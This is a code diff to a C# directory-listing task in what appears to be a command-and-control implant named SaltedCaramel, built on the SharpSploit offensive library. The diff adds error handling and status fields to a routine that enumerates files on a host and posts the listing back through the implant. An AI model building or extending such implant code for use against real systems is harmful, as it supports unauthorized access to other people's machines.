@@ -1,6 +1,7 @@
 ﻿using Newtonsoft.Json;
 using SharpSploit.Enumeration;
 using SharpSploit.Generic;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -9,7 +10,7 @@ namespace SaltedCaramel.Tasks
 {
     class DirectoryList
     {
-        internal static void Execute(SCTask task, SCImplant implant)
+        internal static void Execute(SCTaskObject task, SCImplant implant)
         {
             string path = task.@params;
             SharpSploitResultList<Host.FileSystemEntryResult> list;
@@ -46,11 +47,22 @@ namespace SaltedCaramel.Tasks
                 SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(fileList));
                 implant.PostResponse(response);
                 implant.SendComplete(task.id);
+                task.status = "complete";
+                task.message = fileList.ToString();
             }
             catch (DirectoryNotFoundException)
             {
                 Debug.WriteLine($"[!] DirectoryList - ERROR: Directory not found: {path}");
                 implant.SendError(task.id, "Error: Directory not found.");
+                task.status = "error";
+                task.message = "Directory not found.";
+            }
+            catch (Exception e)
+            {
+                Debug.WriteLine($"DirectoryList - ERROR: {e.Message}");
+                implant.SendError(task.id, $"Error: {e.Message}");
+                task.status = "error";
+                task.message = e.Message;
             }
         }
     }
